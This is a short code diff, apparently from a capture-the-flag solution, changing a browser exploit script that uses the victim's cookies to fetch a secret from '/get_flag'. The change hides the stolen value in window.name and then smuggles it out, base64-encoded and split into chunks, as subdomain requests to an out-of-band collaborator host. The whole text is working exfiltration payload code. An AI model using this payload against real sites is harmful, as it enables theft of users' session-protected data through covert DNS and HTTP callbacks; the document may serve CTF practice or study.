@@ -7,13 +7,17 @@ if (window.opener) {
     fetch('/get_flag', { credentials: 'include' })
       .then(r => r.text())
       .then(flag => {
-        alert(flag);
+        window.name = btoa(flag);
       });
   `);
 
   setTimeout(() => {
-    const win = window.open('', '_self');
-    win.document.write('<h1>Flag:</h1><pre>' + window.name + '</pre>');
+    let flag = window.name;
+    let chunks = flag.match(/.{1,20}/g);
+    for (let i = 0; i < chunks.length; i++) {
+      let sub = chunks[i] + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
+      new Image().src = 'http://' + sub + '/';
+    }
   }, 1500);
 }
 </script>
